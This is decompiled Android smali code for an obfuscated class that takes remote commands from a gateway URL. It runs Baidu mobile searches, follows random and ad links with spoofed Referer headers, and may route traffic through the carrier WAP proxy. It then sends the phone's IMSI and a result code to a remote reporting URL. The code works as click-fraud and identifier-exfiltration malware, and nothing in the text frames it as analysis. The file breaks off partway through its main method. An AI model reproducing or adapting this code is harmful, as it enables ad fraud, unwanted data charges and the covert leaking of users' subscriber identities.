.class public Lcom/xxx/yyy/BBBB;
.super Ljava/lang/Object;
.source "BBBB.java"


# instance fields
.field TAG:Ljava/lang/String;

.field private adurl:Ljava/lang/String;

.field public docount:I

.field private dotype:I

.field public gwul:Ljava/lang/String;

.field public hmul:Ljava/lang/String;

.field private httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

.field public identity:Ljava/lang/String;

.field public imsi:Ljava/lang/String;

.field private iswap:I

.field public prul:Ljava/lang/String;

.field private refer:Ljava/lang/String;

.field private response:Lorg/apache/http/HttpResponse;

.field private result:I

.field private urls:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 3
    .param p1, "dc"    # I
    .param p2, "id"    # Ljava/lang/String;
    .param p3, "gw"    # Ljava/lang/String;
    .param p4, "hm"    # Ljava/lang/String;
    .param p5, "pr"    # Ljava/lang/String;
    .param p6, "im"    # Ljava/lang/String;
    .param p7, "iw"    # I

    .prologue
    .line 42
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 33
    const-string v1, "MyTag"

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->TAG:Ljava/lang/String;

    .line 35
    const-string v1, ""

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    .line 45
    iput p1, p0, Lcom/xxx/yyy/BBBB;->docount:I

    .line 46
    iput-object p2, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    .line 47
    iput-object p3, p0, Lcom/xxx/yyy/BBBB;->gwul:Ljava/lang/String;

    .line 48
    iput-object p4, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    .line 49
    iput-object p5, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    .line 50
    iput-object p6, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    .line 51
    iput p7, p0, Lcom/xxx/yyy/BBBB;->iswap:I

    .line 52
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    .line 53
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    .line 54
    iget v1, p0, Lcom/xxx/yyy/BBBB;->iswap:I

    if-nez v1, :cond_0

    .line 56
    new-instance v0, Lorg/apache/http/HttpHost;

    const-string v1, "10.0.0.172"

    const/16 v2, 0x50

    invoke-direct {v0, v1, v2}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;I)V

    .line 57
    .local v0, "proxy":Lorg/apache/http/HttpHost;
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v1

    const-string v2, "http.route.default-proxy"

    invoke-interface {v1, v2, v0}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 59
    .end local v0    # "proxy":Lorg/apache/http/HttpHost;
    :cond_0
    return-void
.end method

.method private FindHttpHead(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 11
    .param p1, "body"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;

    .prologue
    const/4 v6, 0x0

    const-string v10, "/"

    const-string v9, "https://"

    const-string v7, "http://"

    const-string v8, ""

    .line 175
    const-string v0, ""

    .line 176
    .local v0, "head":Ljava/lang/String;
    const-string v5, "<base href"

    invoke-virtual {p1, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    if-lez v5, :cond_1

    .line 179
    const-string v4, "base href=\".*?\""

    .line 180
    .local v4, "regex":Ljava/lang/String;
    invoke-static {v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 181
    .local v3, "pt":Ljava/util/regex/Pattern;
    invoke-virtual {v3, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 182
    .local v2, "mt":Ljava/util/regex/Matcher;
    :goto_0
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-nez v5, :cond_0

    move-object v1, v0

    .line 201
    .end local v0    # "head":Ljava/lang/String;
    .end local v2    # "mt":Ljava/util/regex/Matcher;
    .end local v3    # "pt":Ljava/util/regex/Pattern;
    .end local v4    # "regex":Ljava/lang/String;
    .local v1, "head":Ljava/lang/String;
    :goto_1
    return-object v1

    .line 183
    .end local v1    # "head":Ljava/lang/String;
    .restart local v0    # "head":Ljava/lang/String;
    .restart local v2    # "mt":Ljava/util/regex/Matcher;
    .restart local v3    # "pt":Ljava/util/regex/Pattern;
    .restart local v4    # "regex":Ljava/lang/String;
    :cond_0
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v5

    const-string v6, "base href=\"|\"|&amp;"

    const-string v7, ""

    invoke-virtual {v5, v6, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 189
    .end local v2    # "mt":Ljava/util/regex/Matcher;
    .end local v3    # "pt":Ljava/util/regex/Pattern;
    .end local v4    # "regex":Ljava/lang/String;
    :cond_1
    const-string v5, "http://"

    invoke-virtual {p2, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 191
    const-string v5, "http://"

    const-string v5, ""

    invoke-virtual {p2, v7, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 192
    const-string v5, "/"

    invoke-virtual {v0, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v0, v6, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 193
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "http://"

    invoke-direct {v5, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_2
    :goto_2
    move-object v1, v0

    .line 201
    .end local v0    # "head":Ljava/lang/String;
    .restart local v1    # "head":Ljava/lang/String;
    goto :goto_1

    .line 195
    .end local v1    # "head":Ljava/lang/String;
    .restart local v0    # "head":Ljava/lang/String;
    :cond_3
    const-string v5, "https://"

    invoke-virtual {p2, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 197
    const-string v5, "https://"

    const-string v5, ""

    invoke-virtual {p2, v9, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 198
    const-string v5, "/"

    invoke-virtual {v0, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v0, v6, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 199
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "https://"

    invoke-direct {v5, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2
.end method

.method private FixUrls(Ljava/lang/String;Ljava/lang/String;)V
    .locals 12
    .param p1, "body"    # Ljava/lang/String;
    .param p2, "head"    # Ljava/lang/String;

    .prologue
    const/4 v10, 0x1

    const-string v11, ""

    .line 125
    const-string v5, "<a.*?/a>"

    .line 126
    .local v5, "regex":Ljava/lang/String;
    invoke-static {v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 127
    .local v3, "pt":Ljava/util/regex/Pattern;
    invoke-virtual {v3, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    .line 128
    .local v1, "mt":Ljava/util/regex/Matcher;
    :cond_0
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-nez v7, :cond_1

    .line 172
    :goto_0
    return-void

    .line 131
    :cond_1
    const-string v6, "a href=\".*?\""

    .line 132
    .local v6, "s3":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "*"

    invoke-virtual {v7, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v7

    if-lez v7, :cond_2

    .line 134
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v10, :cond_0

    .line 136
    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    .line 137
    .local v4, "pt3":Ljava/util/regex/Pattern;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 138
    .local v2, "mt3":Ljava/util/regex/Matcher;
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 140
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "href=\"|\"|&amp;"

    const-string v9, ""

    invoke-virtual {v7, v8, v11}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    goto :goto_0

    .line 147
    .end local v2    # "mt3":Ljava/util/regex/Matcher;
    .end local v4    # "pt3":Ljava/util/regex/Pattern;
    :cond_2
    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    .line 148
    .restart local v4    # "pt3":Ljava/util/regex/Pattern;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 149
    .restart local v2    # "mt3":Ljava/util/regex/Matcher;
    :goto_1
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 150
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "a href=\"|\"|&amp;"

    const-string v9, ""

    invoke-virtual {v7, v8, v11}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 152
    .local v0, "link":Ljava/lang/String;
    const-string v7, "http://"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_3

    .line 154
    const-string v7, "./"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 156
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v8, 0x2

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 168
    :cond_3
    :goto_2
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1

    .line 158
    :cond_4
    const-string v7, "/"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 160
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v10}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    .line 164
    :cond_5
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2
.end method

.method private GetRandomFromMinToMax(II)I
    .locals 5
    .param p1, "min"    # I
    .param p2, "max"    # I

    .prologue
    .line 118
    new-instance v0, Ljava/util/Date;

    invoke-direct {v0}, Ljava/util/Date;-><init>()V

    .line 119
    .local v0, "currentTime":Ljava/util/Date;
    new-instance v1, Ljava/util/Random;

    invoke-virtual {v0}, Ljava/util/Date;->getTime()J

    move-result-wide v3

    invoke-direct {v1, v3, v4}, Ljava/util/Random;-><init>(J)V

    .line 120
    .local v1, "rd":Ljava/util/Random;
    invoke-virtual {v1, p2}, Ljava/util/Random;->nextInt(I)I

    move-result v3

    add-int v2, p1, v3

    .line 121
    .local v2, "ret":I
    return v2
.end method

.method private HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 8
    .param p1, "url"    # Ljava/lang/String;
    .param p2, "ref"    # Ljava/lang/String;

    .prologue
    const-string v7, ""

    .line 86
    new-instance v2, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v2, p1}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 87
    .local v2, "method":Lorg/apache/http/client/methods/HttpGet;
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v5

    if-lez v5, :cond_0

    .line 88
    const-string v5, "Referer"

    invoke-virtual {v2, v5, p2}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 89
    :cond_0
    const-string v5, "Accept"

    const-string v6, "application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"

    invoke-virtual {v2, v5, v6}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 91
    const-string v5, "Accept-Language"

    const-string v6, "zh-CN, en-US"

    invoke-virtual {v2, v5, v6}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 92
    const-string v5, "Accept-Charset"

    const-string v6, "utf-8, iso-8859-1, utf-16, *;q=0.7"

    invoke-virtual {v2, v5, v6}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 95
    :try_start_0
    iget-object v5, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v5, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    iput-object v5, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    .line 96
    iget-object v5, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v5

    invoke-interface {v5}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v4

    .line 98
    .local v4, "status":I
    const/16 v5, 0xc8

    if-eq v4, v5, :cond_1

    .line 113
    invoke-virtual {v2}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 99
    const-string v5, ""

    move-object v5, v7

    .line 111
    .end local v4    # "status":I
    :goto_0
    return-object v5

    .line 100
    .restart local v4    # "status":I
    :cond_1
    :try_start_1
    iget-object v5, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    .line 101
    .local v1, "entity":Lorg/apache/http/HttpEntity;
    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v5

    invoke-virtual {p0, v5}, Lcom/xxx/yyy/BBBB;->generateString(Ljava/io/InputStream;)Ljava/lang/String;
    :try_end_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result-object v3

    .line 113
    .local v3, "result":Ljava/lang/String;
    invoke-virtual {v2}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    move-object v5, v3

    .line 103
    goto :goto_0

    .line 104
    .end local v1    # "entity":Lorg/apache/http/HttpEntity;
    .end local v3    # "result":Ljava/lang/String;
    .end local v4    # "status":I
    :catch_0
    move-exception v5

    move-object v0, v5

    .line 106
    .local v0, "e":Lorg/apache/http/client/ClientProtocolException;
    :try_start_2
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 113
    invoke-virtual {v2}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 107
    const-string v5, ""

    move-object v5, v7

    goto :goto_0

    .line 108
    .end local v0    # "e":Lorg/apache/http/client/ClientProtocolException;
    :catch_1
    move-exception v5

    move-object v0, v5

    .line 110
    .local v0, "e":Ljava/io/IOException;
    :try_start_3
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 113
    invoke-virtual {v2}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 111
    const-string v5, ""

    move-object v5, v7

    goto :goto_0

    .line 112
    .end local v0    # "e":Ljava/io/IOException;
    :catchall_0
    move-exception v5

    .line 113
    invoke-virtual {v2}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 114
    throw v5
.end method


# virtual methods
.method public Go()V
    .locals 15

    .prologue
    const/4 v14, 0x2

    const/4 v13, -0x1

    const/4 v12, 0x3

    const/4 v11, 0x1

    const-string v10, ""

    .line 205
    const-string v8, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    .line 206
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->clear()V

    .line 208
    const-string v0, ""

    .line 210
    .local v0, "body":Ljava/lang/String;
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->gwul:Ljava/lang/String;

    const-string v9, ""

    invoke-direct {p0, v8, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 211
    .local v4, "order":Ljava/lang/String;
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v8

    const/16 v9, 0xa

    if-le v8, v9, :cond_9

    .line 213
    const-string v8, "\\|"

    invoke-virtual {v4, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    aget-object v8, v8, v9

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    iput v8, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    .line 214
    const-string v8, "\\|"

    invoke-virtual {v4, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    aget-object v6, v8, v11

    .line 216
    .local v6, "search":Ljava/lang/String;
    iput-object v6, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    .line 217
    iget v8, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-eq v8, v12, :cond_0

    .line 219
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v8

    const/4 v9, 0x5

    if-le v8, v9, :cond_0

    .line 221
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    const-string v9, ""

    invoke-direct {p0, v8, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 225
    :cond_0
    const-wide/16 v8, 0x3e8

    :try_start_0
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 230
    const-string v8, ""

    invoke-direct {p0, v6, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 231
    const-string v8, "http://wap.baidu.com/"

    invoke-direct {p0, v0, v8}, Lcom/xxx/yyy/BBBB;->FixUrls(Ljava/lang/String;Ljava/lang/String;)V

    .line 233
    iput v11, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 234
    const-string v7, ""

    .line 235
    .local v7, "url":Ljava/lang/String;
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v8

    if-eqz v8, :cond_1

    iget v8, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v8, v14, :cond_4

    :cond_1
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    if-lez v8, :cond_4

    .line 239
    iput v14, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 241
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-direct {p0, v13, v8}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v5

    .line 242
    .local v5, "pos":I
    if-ltz v5, :cond_2

    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    sub-int/2addr v8, v11

    if-le v5, v8, :cond_3

    .line 243
    :cond_2
    const/4 v5, 0x0

    .line 244
    :cond_3
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    .end local v7    # "url":Ljava/lang/String;
    check-cast v7, Ljava/lang/String;

    .line 246
    .end local v5    # "pos":I
    .restart local v7    # "url":Ljava/lang/String;
    :cond_4
    iget v8, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v8, v12, :cond_5

    .line 247
    const-string v7, ""

    .line 249
    :cond_5
    const/4 v2, 0x0

    .line 250
    .local v2, "flag":Z
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v8

    if-lez v8, :cond_a

    .line 252
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 253
    const/4 v2, 0x1

    .line 262
    :goto_0
    if-eqz v2, :cond_8

    .line 264
    invoke-direct {p0, v0, v7}, Lcom/xxx/yyy/BBBB;->FindHttpHead(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 265
    .local v3, "head":Ljava/lang/String;
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->clear()V

    .line 266
    invoke-direct {p0, v0, v3}, Lcom/xxx/yyy/BBBB;->FixUrls(Ljava/lang/String;Ljava/lang/String;)V

    .line 267
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    if-lez v8, :cond_8

    .line 269
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-direct {p0, v13, v8}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v5

    .line 270
    .restart local v5    # "pos":I
    if-ltz v5, :cond_6

    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    sub-int/2addr v8, v11

    if-le v5, v8, :cond_7

    .line 271
    :cond_6
    const/4 v5, 0x0

    .line 272
    :cond_7
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    .end local v7    # "url":Ljava/lang/String;
    check-cast v7, Ljava/lang/String;

    .line 273
    .restart local v7    # "url":Ljava/lang/String;
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 276
    .end local v3    # "head":Ljava/lang/String;
    .end local v5    # "pos":I
    :cond_8
    new-instance v8, Ljava/lang/StringBuilder;

    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "?imsi="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&way="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&result="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    iget v9, p0, Lcom/xxx/yyy/BBBB;->result:I

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 277
    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 279
